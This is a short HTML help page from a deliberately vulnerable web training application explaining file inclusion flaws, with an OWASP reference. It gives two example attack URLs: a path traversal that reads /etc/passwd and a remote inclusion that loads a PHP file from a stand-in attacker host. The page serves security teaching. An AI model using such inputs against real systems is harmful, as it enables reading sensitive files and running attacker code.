<div class="body_padded">
	<h1>Help - File Inclusion</h1>
	
	<div id="code">
	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
	<tr>
	<td><div id="code">

		<p>Some web applications allow the user to specify input that is used directly into file streams or allows the user to upload files to the server.
		At a later time the web application accesses the user supplied input in the web applications context. By doing this, the web application is allowing
		the potential for malicious file execution.</p>
		
		<p>Local Example: http://127.0.0.1/dvwa/fi/?page=../../../../../../etc/passwd</p>
		
		<p>or</p>
		
		<p>Remote Example: http://127.0.0.1/dvwa/fi/?page=http://www.evilsite.com/evil.php</p>
		
	</div></td>
	</tr>
	</table>
	
	</div>
	
	<br />
	
	<p>Reference: http://www.owasp.org/index.php/Top_10_2007-A3</p>

</div>
		